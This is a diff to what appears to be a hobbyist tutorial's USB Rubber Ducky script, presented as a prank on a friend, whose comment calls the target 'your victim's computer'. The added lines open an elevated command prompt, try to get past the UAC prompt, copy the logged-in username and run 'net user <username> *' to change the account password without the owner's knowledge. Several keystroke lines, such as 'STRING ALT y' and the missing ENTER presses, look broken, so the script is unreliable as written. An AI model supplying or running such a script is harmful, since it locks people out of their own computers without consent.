@@ -15,11 +15,53 @@ Finally using exit command, it closes the command prompt. That is pretty much it
 The ducky code:(replace the word "_pass_" with the password you want. Just remember it, incase your friend finds out it was you!!)
 
 REM Adjust the delays according to how slow or fast your victim's computer is.
+
+DELAY 200
+
 GUI r
+
 DELAY 200
+
 STRING cmd
+
 DELAY 200
-ENTER
+
+CTRL SHIFT ENTER
+
+DELAY 200
+
+STRING ALT y
+
+DELAY 200
+
 STRING echo %username% |clip
 
+DELAY 200
 
+STRING net user *
+
+DELAY 200
+
+LEFTARROW
+
+DELAY 200
+
+SHIFT INSERT
+
+DELAY 200
+
+STRING pass
+
+DELAY 200
+
+STRING pass
+
+DELAY 200
+
+STRING exit
+
+DELAY 200
+
+ENTER
+
+REM Execution Complete!!
